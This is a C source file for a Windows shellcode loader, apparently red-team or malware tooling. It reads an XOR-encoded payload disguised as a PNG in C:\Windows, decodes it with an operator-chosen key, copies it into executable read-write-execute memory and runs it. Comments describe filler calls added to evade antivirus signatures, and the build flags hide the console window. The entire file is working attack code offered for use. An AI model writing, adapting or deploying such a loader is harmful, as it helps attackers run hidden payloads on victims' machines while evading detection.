// x86_64-w64-mingw32-gcc loader.c -static -w -s -Wl,-subsystem,windows -o loader.exe
// Use make!
#include <stdio.h>
#include <windows.h>

unsigned char* decoded;

int math(unsigned char *encoded, unsigned char key[], int keylen, int long size)
{
    decoded = (unsigned char*)malloc(size);
    for (int i = 0; i < size; i++)
    {
        decoded[i] = encoded[i] ^ key[i % keylen];
    }
    return 0;
}

int main(int argc, char *argv[])
{
    char *fileName = "C:\\Windows\\image02.png";
    printf("Attemping to read %s\n", fileName);

    // Get size of raw shellcode file
    FILE * file = fopen(fileName, "rb");
    if (file == NULL) return 1;
    fseek(file, 0, SEEK_END);
    long int size = ftell(file);
    fclose(file);

    // Allocate memory according to size, and read contents of file into buffer
    file = fopen(fileName, "rb");
    unsigned char * shellcode = (unsigned char *) malloc(size);
    int bytes_read = fread(shellcode, sizeof(unsigned char), size, file);
    fclose(file);

    // XOR key. Make sure it matches the key used to encode shellcode
    unsigned char key[] = "OPERATORCHANGEMEPLZZZ";

    // random crap... helps evade some signatures feel free to replace with whatever...
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE); 
    DWORD mode = 0;
    GetConsoleMode(hStdin, &mode);
    SetConsoleMode(hStdin, mode & (~ENABLE_ECHO_INPUT));

    // decode shellcode and free heap memory
    math(shellcode, key, strlen(key), size);
    free(shellcode);
    
    // allocate RWX memory, copy decoded shellcode, and free heap memory
    void *exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, decoded, size);
    free(decoded);

    //execute shellcode via function pointer
    ((void(*)())exec)();

    return 0;
}